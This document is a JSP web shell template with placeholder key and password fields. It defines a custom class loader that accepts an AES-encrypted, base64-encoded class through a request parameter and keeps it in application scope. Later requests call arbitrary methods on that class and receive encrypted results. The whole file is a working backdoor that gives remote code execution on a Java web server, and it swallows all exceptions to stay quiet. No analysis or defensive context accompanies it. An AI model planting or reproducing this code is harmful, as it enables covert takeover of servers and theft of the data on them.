<%! 
class Myloader extends ClassLoader
{   
    public  Class get(byte[] b)
    {
        return super.defineClass(b, 0, b.length);       
    }
}

public static String base64Encode(byte[] bs) throws Exception { 
    Class base64; 
    String value = null; 
    try {
        base64 = Class.forName("java.util.Base64");
        Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
        value = (String) Encoder.getClass()
            .getMethod("encodeToString", new Class[] { byte[].class })
            .invoke(Encoder, new Object[] { bs });
    } catch (Exception e) {
        try {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = base64.newInstance();
            value = (String) Encoder.getClass()
                .getMethod("encode", new Class[] { byte[].class })
                .invoke(Encoder, new Object[] { bs });
        } catch (Exception e2) {}
    }
    return value; 
}

public static byte[] base64Decode(String bs) throws Exception {
    Class base64; 
    byte[] value = null; 
    try {
        base64 = Class.forName("java.util.Base64");
        Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
        value = (byte[]) decoder.getClass()
            .getMethod("decode", new Class[] { String.class })
            .invoke(decoder, new Object[] { bs });
    } catch (Exception e) {
        try {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass()
                .getMethod("decodeBuffer", new Class[] { String.class })
                .invoke(decoder, new Object[] { bs });
        } catch (Exception e2) {}
    }
    return value; 
}

public String x(byte[] s, boolean m) {
    String xc = "{{{key}}}";
    try {
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
        byte[] result = c.doFinal(s);
        return base64Encode(result);
    } catch (Exception e) {
        return null;
    }
}

%>

<%
try {
    if (application.getAttribute("WYGUF") == null) {
        if(request.getParameter("initclass") != null){
            byte[] classbytes = base64Decode(x(base64Decode(request.getParameter("initclass")),false));
            application.setAttribute("WYGUF", new Myloader().get(classbytes));
        }else{
            out.println(x("class not init".getBytes(),true));
        }
    } else {
        String pass = "{{{pass}}}";
        String data = new String(base64Decode(x((base64Decode(request.getParameter(pass))),false)));

        String[] dataArray = data.split(",");
        String funcname = dataArray[0];
        String[] funcargs = new String(base64Decode(dataArray[1])).split(",");
        Object instance = ((Class) application.getAttribute("WYGUF")).newInstance();
        out.println(x((byte[])instance.getClass().getMethod(funcname,String[].class).invoke(instance, (Object) funcargs),true));
    }
} catch (Exception e) {}
%>
